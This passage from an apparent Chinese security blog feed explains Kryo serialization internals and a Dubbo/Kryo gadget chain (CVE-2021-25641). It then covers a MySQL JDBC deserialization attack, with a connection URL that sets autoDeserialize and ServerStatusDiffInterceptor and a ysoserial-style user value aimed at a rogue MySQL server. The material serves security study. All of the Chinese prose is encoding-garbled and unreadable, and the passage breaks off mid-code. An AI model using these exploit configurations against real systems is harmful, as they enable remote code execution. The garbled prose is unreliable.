class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.esotericsoftware.kryo.Kryo;<br><span class="hljs-keyword">import</span> com.esotericsoftware.kryo.io.Input;<br><span class="hljs-keyword">import</span> com.esotericsoftware.kryo.io.Output;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Kryo</span> <span class="hljs-variable">kryo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Kryo</span>();<br>        kryo.register(MyClass.class);<br>        <span class="hljs-type">MyClass</span> <span class="hljs-variable">myClass</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyClass</span>();<br>        myClass.setHello(<span class="hljs-string">&quot;Hello Kryo&quot;</span>);<br>        myClass.setNum(<span class="hljs-number">11</span>);<br><br>        <span class="hljs-type">Output</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Output</span>(Files.newOutputStream(Paths.get(<span class="hljs-string">&quot;file.bin&quot;</span>)));<br>        kryo.writeObject(output, myClass);<br>        output.close();<br><br>        <span class="hljs-type">Input</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Input</span>(Files.newInputStream(Paths.get(<span class="hljs-string">&quot;file.bin&quot;</span>)));<br>        <span class="hljs-type">MyClass</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> kryo.readObject(input, MyClass.class);<br>        input.close();<br>        System.out.println(obj);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// MyClass&#123;hello=&#x27;Hello Kryo&#x27;, num=11&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Ser-Deser"><a href="#Ser-Deser" class="headerlink" title="Ser &amp; Deser"></a>Ser &amp; Deser</h2><p><code>Kryo</code>æä¾›äº†ä¸‰ç»„æ–¹æ³•æ¥è¯»å†™å¯¹è±¡</p><blockquote><ul><li>ç±»æœªçŸ¥ä¸”å¯¹è±¡å¯èƒ½ä¸ºnull</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">kryo.writeClassAndObject(output, object);<br><span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> kryo.readClassAndObject(input);<br></code></pre></td></tr></table></figure><ul><li>ç±»å·²çŸ¥ä¸”å¯¹è±¡å¯èƒ½ä¸ºnull</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">kryo.writeObjectOrNull(output, object);<br><span class="hljs-type">SomeClass</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> kryo.readObjectOrNull(input, SomeClass.class);<br></code></pre></td></tr></table></figure><ul><li>ç±»å·²çŸ¥ä¸”å¯¹è±¡ä¸ä¸ºnull</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">kryo.writeObject(output, object);<br><span class="hljs-type">SomeClass</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> kryo.readObject(input, SomeClass.class);<br></code></pre></td></tr></table></figure></blockquote><p>è¿™äº›æ–¹æ³•é¦–å…ˆéƒ½æ˜¯æ‰¾åˆ°åˆé€‚çš„åºåˆ—åŒ–å™¨ï¼ˆserializerï¼‰ï¼Œå†è¿›è¡Œåºåˆ—åŒ–æˆ–ååºåˆ—åŒ–ï¼Œåºåˆ—åŒ–å™¨ä¼šé€’å½’åœ°è°ƒç”¨è¿™äº›æ–¹æ³•ã€‚</p><h3 id="Kryoçš„æ³¨å†Œ"><a href="#Kryoçš„æ³¨å†Œ" class="headerlink" title="Kryoçš„æ³¨å†Œ"></a>Kryoçš„æ³¨å†Œ</h3><p>Kryoä¸ºäº†æä¾›æ€§èƒ½å’Œå‡å°åºåˆ—åŒ–ç»“æœä½“ç§¯ï¼Œæä¾›æ³¨å†Œåºåˆ—åŒ–å¯¹è±¡ç±»çš„æ–¹å¼ã€‚</p><p>åœ¨æ³¨å†Œæ—¶ï¼Œä¼šä¸ºè¯¥åºåˆ—åŒ–ç±»ç”Ÿæˆint ID, åç»­åœ¨åºåˆ—åŒ–æ—¶ä½¿ç”¨int IDå”¯ä¸€æ ‡è¯†è¯¥ç±»å‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">kryo.register(SomeClass.class);<br></code></pre></td></tr></table></figure><h3 id="åºåˆ—åŒ–æµç¨‹"><a href="#åºåˆ—åŒ–æµç¨‹" class="headerlink" title="åºåˆ—åŒ–æµç¨‹"></a>åºåˆ—åŒ–æµç¨‹</h3><p>è·Ÿè¿›<code>writeClassAndObject</code>ï¼š</p><p><img src="/2024/08/14/Kyro/image-20240814215655799.png" alt="image-20240814215655799"></p><h4 id="Registrationè·å–"><a href="#Registrationè·å–" class="headerlink" title="Registrationè·å–"></a>Registrationè·å–</h4><p><code>writeClass(output, object.getClass())</code>è¿”å›ä¸€ä¸ª<code>object</code>ç±»çš„<code>Registration</code></p><p>è‹¥è¯¥ç±»æ²¡æœ‰æ³¨å†Œè¿‡ï¼ˆä¹Ÿå°±æ˜¯æ²¡æœ‰ä¸Šé¢çš„<code>kryo.register</code>æŒ‡å®šä¸€ä¸ªç±»ï¼‰ï¼Œä¼šè‡ªåŠ¨ä½¿ç”¨é»˜è®¤çš„åºåˆ—åŒ–å™¨æ³¨å†Œï¼Œæ³¨å†Œæœ‰ä¸¤ä¸ªç›®çš„ï¼šè·å–åºåˆ—åŒ–å™¨å’Œç±»çš„å”¯ä¸€æ ‡è¯†Idï¼Œæ–¹ä¾¿åç»­çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">get:<span class="hljs-number">351</span>, ObjectMap (com.esotericsoftware.kryo.util)<br>getRegistration:<span class="hljs-number">79</span>, DefaultClassResolver (com.esotericsoftware.kryo.util)<br>getRegistration:<span class="hljs-number">488</span>, Kryo (com.esotericsoftware.kryo)<br>writeClass:<span class="hljs-number">97</span>, DefaultClassResolver (com.esotericsoftware.kryo.util)<br>writeClass:<span class="hljs-number">540</span>, Kryo (com.esotericsoftware.kryo)<br>writeClassAndObject:<span class="hljs-number">645</span>, Kryo (com.esotericsoftware.kryo)<br>main:<span class="hljs-number">16</span>, Test<br></code></pre></td></tr></table></figure><p><code>com.esotericsoftware.kryo.util.ObjectMap</code>ç±»ç»´æŠ¤äº†ä¸€ä¸ª<code>Class</code>ä¸<code>Registration</code>ï¼ˆå«ç›¸å¯¹åº”çš„ååºåˆ—åŒ–å™¨ï¼‰çš„å¯¹åº”è¡¨ï¼š</p><p><img src="/2024/08/14/Kyro/image-20240814215910090.png" alt="image-20240814215910090"></p><p>å½“ç„¶æˆ‘ä»¬è‡ªå®šä¹‰çš„ç±»è‚¯å®šåœ¨è¿™ä¸ªè¡¨ä¸­æ‰¾ä¸åˆ°ï¼Œé‡Œé¢éƒ½æ˜¯Javaçš„åŸºç¡€ç±»ï¼Œ<code>DefaultClassResolver#getRegistration</code>å°±è¿”å›nullã€‚</p><p>æ¥ç€è¿›å…¥<code>registerImplicit</code> -&gt; <code>getDefaultSerializer</code>ç»§ç»­æ‰¾ä¸€äº›Javaå†…ç½®ç±»æ˜¯å¦å’Œå¾…åºåˆ—åŒ–ç±»å¯¹åº”</p><p><img src="/2024/08/14/Kyro/image-20240814215948131.png" alt="image-20240814215948131"></p><p>ç»§ç»­è·Ÿè¿›ï¼Œå‘ç°<code>FieldSerializer</code>ä½œä¸ºé»˜è®¤åºåˆ—åŒ–å™¨ï¼Œå¹¶åœ¨<code>FieldSerializer#rebuildCachedFields</code>ä¸­è·å–åºåˆ—åŒ–ç±»çš„<code>Fields</code>ï¼Œå¿½ç•¥é™æ€æˆå‘˜ã€‚</p><p><img src="/2024/08/14/Kyro/image-20240814220004870.png" alt="image-20240814220004870"></p><p>åˆ°æ­¤å°±è·å–åˆ°äº†è‡ªå®šä¹‰ç±»çš„<code>Registration</code>ã€‚</p><h4 id="Fieldåºåˆ—åŒ–"><a href="#Fieldåºåˆ—åŒ–" class="headerlink" title="Fieldåºåˆ—åŒ–"></a>Fieldåºåˆ—åŒ–</h4><p>æ¥ç€è¿›å…¥<code>FieldSerializer.write(this, output, object);</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">CachedField[] fields = <span class="hljs-built_in">this</span>.fields;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>, n = fields.length; i &lt; n; i++)<br>    fields[i].write(output, object);<br></code></pre></td></tr></table></figure><p><code>Kryo</code>å°è£…äº†ä¸€ä¸ª<code>UnsafeUtil</code>ï¼ˆ<code>Unsafe</code>å¯¹è±¡é€šè¿‡åå°„è·å–ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> sun.misc.Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>field.setAccessible(<span class="hljs-literal">true</span>);<br>_unsafe = (sun.misc.Unsafe)field.get(<span class="hljs-literal">null</span>);<br></code></pre></td></tr></table></figure><p>åœ¨JVMä¸­ï¼Œå¯¹å®ä¾‹çš„Fieldè¿›è¡Œäº†æœ‰è§„å¾‹çš„å­˜å‚¨ï¼Œé€šè¿‡ä¸€ä¸ªåç§»é‡å¯ä»¥ä»å†…å­˜ä¸­æ‰¾åˆ°ç›¸åº”çš„Fieldå€¼</p><p>unsafeå®ç°äº†åœ¨å†…å­˜å±‚é¢ï¼Œé€šè¿‡æˆå‘˜å­—æ®µåç§»é‡offsetæ¥è·å–å¯¹è±¡çš„å±æ€§å€¼</p><p>æ¥ç€è·å–æˆå‘˜çš„åºåˆ—åŒ–å™¨ï¼Œæ­¥éª¤è·Ÿä¸Šé¢çš„ä¸€æ ·ï¼ˆ<code>getRegistration(type).getSerializer()</code>ï¼‰</p><p><img src="/2024/08/14/Kyro/image-20240814220143706.png" alt="image-20240814220143706"></p><p>å‰©ä¸‹çš„å°±æ˜¯ç»§ç»­é€’å½’æ‰€æœ‰æˆå‘˜ï¼Œè·å–åºåˆ—åŒ–å™¨è¿›è¡Œåºåˆ—åŒ–ã€‚</p><h3 id="ååºåˆ—åŒ–æµç¨‹"><a href="#ååºåˆ—åŒ–æµç¨‹" class="headerlink" title="ååºåˆ—åŒ–æµç¨‹"></a>ååºåˆ—åŒ–æµç¨‹</h3><p>åŒæ ·ä¹Ÿæ˜¯å…ˆè·å–ç±»çš„<code>Registration</code>ï¼Œå†ä»<code>Registration</code>æ‹¿åºåˆ—åŒ–å™¨ã€‚</p><p><img src="/2024/08/14/Kyro/image-20240814220215114.png" alt="image-20240814220215114"></p><p><code>FieldSerializer#read</code>é¦–å…ˆå¯¹ç±»è¿›è¡Œå®ä¾‹åŒ–ï¼Œè¿™é‡Œæ˜¯ä½¿ç”¨äº†Kryoå°è£…çš„<code>com.esotericsoftware.reflectasm#ConstructorAccess</code>å»æ„é€ ç±»å¯¹è±¡ï¼ŒåŸºäºASMï¼Œè¿˜æ²¡å­¦è¿‡ASMï¼Œå°±ä¸æ·±å…¥è·Ÿè¿›å»çœ‹äº†ã€‚</p><p><img src="/2024/08/14/Kyro/image-20240814220231804.png" alt="image-20240814220231804"></p><p>åŒæ ·æ˜¯è·å–æˆå‘˜çš„åºåˆ—åŒ–å™¨ï¼Œé€’å½’è°ƒç”¨<code>readObject</code>ï¼š</p><p><img src="/2024/08/14/Kyro/image-20240814220247330.png" alt="image-20240814220247330"></p><p>å¯ä»¥è·Ÿä¸€ä¸‹è¿™é‡Œçš„<code>readObjectOrNull</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">object = (T)serializer.read(<span class="hljs-built_in">this</span>, input, type);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„åºåˆ—åŒ–å™¨æ˜¯<code>StringSerializer</code>ï¼Œç›´æ¥ä»è¾“å…¥æµinputè¯»å–äº†ï¼Œå¦åˆ™å°±ç»§ç»­è°ƒç”¨ä¸Šé¢çš„<code>FieldSerializer#read</code>äº†</p><p>åé¢çš„<code>setField</code>ä¹Ÿæ˜¯ç”¨<code>unsafe</code>ä»å†…å­˜å±‚é¢å¾€æˆå‘˜åç§»é‡å¤„å¡«å……å€¼</p><p><img src="/2024/08/14/Kyro/image-20240814220307247.png" alt="image-20240814220307247"></p><p>ååºåˆ—åŒ–ç»“æŸã€‚</p><p>å¯æ€»ç»“ä¸ºï¼š</p><p><img src="/2024/08/14/Kyro/image-20240814220339130.png" alt="image-20240814220339130"></p><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><p>ç½‘ä¸Šæ‰¾åˆ°çš„Kryoååºåˆ—åŒ–é—®é¢˜éƒ½æ˜¯åœ¨Dubboé‚£å—çš„ã€‚</p><p>Dubboé»˜è®¤çš„åºåˆ—åŒ–åè®®æ˜¯Hessianï¼Œä½†å¯ä»¥ä¿®æ”¹Dubboåè®®æ•°æ®åŒ…ä¸­çš„headerï¼ŒæŒ‡å®šSerializationIDï¼Œæ¥ç¡®å®šConsumerå’ŒProvideré€šä¿¡ä½¿ç”¨çš„åºåˆ—åŒ–åè®®ï¼Œè¿™é‡Œå°±ä¸ç»†è®²Dubboæ•°æ®åŒ…çš„ä¿®æ”¹äº†ï¼Œè€Œæ˜¯æŠ½å–å…¶ä¸­å…³é”®çš„Kryoååºåˆ—åŒ–ï¼ŒDubboç›¸å…³çš„å…·ä½“å¯ä»¥çœ‹<a href="https://p4d0rn.gitbook.io/java/serial-journey/dubbo">å¤§ä½¬å†™çš„</a>ã€‚</p><p><strong>è°ƒç”¨æ ˆ</strong></p><blockquote><p>getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</p><p>newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</p><p>getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</p><p>write:-1, ASMSerializer_1_TemplatesImpl (com.alibaba.fastjson.serializer)</p><p>write:270, MapSerializer (com.alibaba.fastjson.serializer)</p><p>write:44, MapSerializer (com.alibaba.fastjson.serializer)</p><p>write:280, JSONSerializer (com.alibaba.fastjson.serializer)</p><p>toJSONString:863, JSON (com.alibaba.fastjson)</p><p>toString:857, JSON (com.alibaba.fastjson)</p><p>equals:392, XString (com.sun.org.apache.xpath.internal.objects)</p><p>equals:104, HotSwappableTargetSource (org.springframework.aop.target)</p><p>putVal:635, HashMap (java.util)</p><p>put:612, HashMap (java.util)</p><p>read:162, MapSerializer (com.esotericsoftware.kryo.serializers)</p><p>read:39, MapSerializer (com.esotericsoftware.kryo.serializers)</p><p>readClassAndObject:813, Kryo (com.esotericsoftware.kryo)</p></blockquote><p>Kryoä»inputä¸­è¯»å–è§£æåˆ°typeä¸ºHashMap</p><p>å› æ­¤ä¼šè°ƒç”¨<code>MapSerializer</code>åºåˆ—åŒ–å™¨æ¥è¯»å–inputä¸­çš„ä¿¡æ¯</p><p>æ—¢ç„¶æ˜¯Mapçš„ååºåˆ—åŒ–å°±è‚¯å®šæ¶‰åŠåˆ°é”®å€¼å¯¹çš„å¤„ç†</p><p><code>MapSerializer</code>ä¼šå°†è§£æåˆ°çš„keyå’Œvalueéƒ½é€šè¿‡è°ƒç”¨<code>map.put()</code>æ¥æ”¾å…¥HashMapå¯¹è±¡ä¸­</p><p>æ¥ç€è°ƒç”¨<code>putVal()</code>ï¼Œ<code>equals()</code>åˆ¤æ–­ä¸¤ä¸ªé”®æ˜¯å¦ç›¸å¯¹</p><p><code>com.sun.org.apache.xpath.internal.objects.XString#equals</code>ä¼šè°ƒç”¨<code>toString</code></p><p><img src="/2024/08/14/Kyro/image-20240814220600476.png" alt="image-20240814220600476"></p><p><code>org.springframework.aop.target.HotSwappableTargetSource#equals</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">equals</span><span class="hljs-params">(Object other)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span> == other || other <span class="hljs-keyword">instanceof</span> HotSwappableTargetSource &amp;&amp; <span class="hljs-built_in">this</span>.target.equals(((HotSwappableTargetSource)other).target);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¤šå¥—ä¸€ä¸ª<code>HotSwappableTargetSource</code>æ˜¯ä¸ºäº†è®©HashMapçš„<code>putVal</code>èƒ½èµ°åˆ°<code>equals</code></p><p>è¿™é‡Œè§¦å‘<code>com.alibaba.fastjson.JSON</code>ç±»çš„<code>toString()</code>å‡½æ•°ï¼Œè¿›è€Œè°ƒç”¨<code>JSONSerializer</code>çš„<code>write()</code>å‡½æ•°ï¼Œä»è€Œè§¦å‘Fastjson Gadgetã€‚</p><p>å‚è€ƒï¼š</p><ul><li><a href="https://www.mi1k7ea.com/2021/06/30/%E6%B5%85%E6%9E%90Dubbo-KryoFST%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-25641%EF%BC%89/">æµ…æDubbo Kryo&#x2F;FSTååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2021-25641ï¼‰Mi1k7ea</a></li><li><a href="https://p4d0rn.gitbook.io/java/serial-journey/kryo#kryo-de-zhu-ce">Kryo | Java (gitbook.io)</a></li><li><a href="https://www.cnblogs.com/bitterz/p/15588955.html">Dubboçš„ååºåˆ—åŒ–å®‰å…¨é—®é¢˜â€”â€”kryoå’Œfst - bitterz - åšå®¢å›­ (cnblogs.com)</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JDBC</title>
    <link href="/2024/08/13/JDBC/"/>
    <url>/2024/08/13/JDBC/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>JDBCï¼ˆJava DataBase Connectivityï¼‰æ˜¯SUNå…¬å¸å‘å¸ƒçš„ä¸€ä¸ªjavaç¨‹åºä¸æ•°æ®åº“ä¹‹é—´é€šä¿¡çš„æ¥å£ï¼ˆè§„èŒƒï¼‰ï¼Œå„å¤§æ•°æ®åº“å‚å•†å»å®ç°JDBCè§„èŒƒï¼Œå¹¶å°†å®ç°ç±»æ‰“åŒ…æˆjaråŒ…ã€‚</p><p><img src="/2024/08/13/JDBC/image-20240813152834923.png" alt="image-20240813152834923"></p><p>ç”±äºJDKç‰ˆæœ¬çš„æå‡ä»¥åŠä¾èµ–åŒ…çš„æ›´æ–°ï¼Œå„ç§æ¶æ„ç±»æ–¹é¢çš„ååºåˆ—åŒ–éƒ½æˆ–å¤šæˆ–å°‘æ”¶åˆ°å½±å“ï¼Œèƒ½æ‰“çš„é“¾å­ä¹Ÿä¼šè¶Šæ¥è¶Šå°‘ï¼Œä½†æ˜¯JDBCæŠŠæ•°æ®åº“æœºåˆ¶å¼•å…¥ï¼Œä½¿å¾—åœ¨å½“å‰å¤§ç¯å¢ƒä¸‹Javaæ¼æ´ä¸ä»…ä»…å±€é™åœ¨javaæ–¹é¢ï¼Œä¹Ÿå¯ä»¥é…åˆæ•°æ®åº“æ–¹é¢è¿›è¡Œattackï¼Œè¿™ç§æ–¹å¼ä»æ—§ç»ä¹…ä¸è¡°ï¼Œè¶³è§JDBCæ”»å‡»çš„é€‚åº”æ€§ä¹‹å¼ºã€‚</p><p>æ‰€ä»¥Hessianæˆ‘è¿˜æ˜¯æ”¾åˆ°åé¢å†è¯´ï¼Œè¿™é‡Œå…ˆæŠŠJDBCæµ…æµ…å¼•å…¥ä¸€ä¸‹ã€‚</p><h2 id="MySQL-JDBC"><a href="#MySQL-JDBC" class="headerlink" title="MySQL-JDBC"></a>MySQL-JDBC</h2><h3 id="ååºåˆ—åŒ–åˆ†æ"><a href="#ååºåˆ—åŒ–åˆ†æ" class="headerlink" title="ååºåˆ—åŒ–åˆ†æ"></a>ååºåˆ—åŒ–åˆ†æ</h3><p>è¿›è¡Œæ•°æ®åº“è¿æ¥æ—¶æŒ‡å®šäº†æ•°æ®åº“çš„URLåŠè¿æ¥é…ç½®</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Connection</span> <span class="hljs-variable">con</span> <span class="hljs-operator">=</span> DriverManager.getConnection(<span class="hljs-string">&quot;jdbc:mysql://localhost:3306/test&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>);<br></code></pre></td></tr></table></figure><p>è‹¥JDBCè¿æ¥çš„URLè¢«æ”»å‡»è€…æ§åˆ¶ï¼Œå°±å¯ä»¥è®©å…¶æŒ‡å‘æ¶æ„çš„MySQLæœåŠ¡å™¨</p><p>JDBCè¿æ¥MySQLæœåŠ¡ç«¯æ—¶ï¼Œä¼šæœ‰å‡ ä¸ªå†…ç½®çš„SQLæŸ¥è¯¢è¯­å¥ä¼šæ‰§è¡Œï¼ŒæŸ¥è¯¢çš„ç»“æœé›†ä¼šåœ¨MySQLå®¢æˆ·ç«¯è¢«å¤„ç†æ—¶ä¼šè°ƒç”¨<code>ObjectInputStream#readObject</code>è¿›è¡Œååºåˆ—åŒ–ã€‚</p><p>æ”»å‡»è€…å¯ä»¥æ­å»ºæ¶æ„MySQLæœåŠ¡å™¨ï¼Œè¿”å›ç²¾å¿ƒæ„é€ çš„æŸ¥è¯¢ç»“æœé›†ï¼Œè¿›è¡Œå®¢æˆ·ç«¯ååºåˆ—åŒ–æ”»å‡»ã€‚</p><p>å¯è¢«åˆ©ç”¨çš„ä¸¤æ¡æŸ¥è¯¢è¯­å¥ï¼š</p><ul><li>SHOW SESSION STATUS</li><li>SHOW COLLATION</li></ul><p>æ¶æ„MySQLæœåŠ¡å™¨æ­å»ºï¼š</p><ul><li><a href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a> ğŸ“Œ</li><li><a href="https://github.com/rmb122/rogue_mysql_server">https://github.com/rmb122/rogue_mysql_server</a></li></ul><p>ä¸Šè¿°å·¥å…·æ˜¯æ¨¡æ‹ŸMySQLå‘åŒ…è¿‡ç¨‹ç”¨çš„ï¼Œåªéœ€è¦å¼€å¯¹åº”ç«¯å£è¿è¡Œè„šæœ¬å°±å¯ä»¥äº†ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.13<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.sql.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class.forName(<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jdbc_url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:mysql://127.0.0.1:3306/test?&quot;</span> +<br>            <span class="hljs-string">&quot;autoDeserialize=true&quot;</span> + <span class="hljs-string">&quot;&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections7_calc&quot;</span>;<br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">con</span> <span class="hljs-operator">=</span> DriverManager.getConnection(jdbc_url, <span class="hljs-string">&quot;yso_CommonsCollections7_calc&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">DriverManager#getConnection<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">connectOneTryOnly=&gt;<span class="hljs-built_in">this</span>.session.setQueryInterceptors(<span class="hljs-built_in">this</span>.queryInterceptors);<br></code></pre></td></tr></table></figure><p>è®¾ç½®å¯¹åº”çš„æŸ¥è¯¢æ‹¦æˆªå™¨ï¼ˆå³æˆ‘ä»¬æŒ‡å®šçš„<code>ServerStatusDiffInterceptor</code>ï¼‰</p><p>æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ä¼šè°ƒç”¨æ‹¦æˆªå™¨çš„<code>preProcess</code>å’Œ<code>postProcess</code></p><p>åˆ¤æ–­æ‹¦æˆªå™¨æ˜¯å¦ä¸ºç©ºï¼Œéç©ºåˆ™è°ƒç”¨<code>invokeQueryInterceptorsPre</code></p><p><img src="/2024/08/13/JDBC/image-20240813174856268.png" alt="image-20240813174856268"></p><p><code>invokeQueryInterceptorsPre</code>è°ƒç”¨äº†æ‹¦æˆªå™¨çš„<code>preProcess</code>ï¼š</p><p><img src="/2024/08/13/JDBC/image-20240813174917368.png" alt="image-20240813174917368"></p><p>çœ‹åˆ°æ‰§è¡Œäº†<code>SHOW SESSION STATUS</code>ï¼Œå¹¶å°†ç»“æœï¼ˆ<code>com.mysql.cj.jdbc.result.ResultSetImpl</code>ï¼‰ä¼ å…¥<code>ResultSetUtil#resultSetToMap</code>è¿›è¡Œååºåˆ—åŒ–å¤„ç†ï¼š</p><p><img src="/2024/08/13/JDBC/image-20240813175009305.png" alt="image-20240813175009305"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> 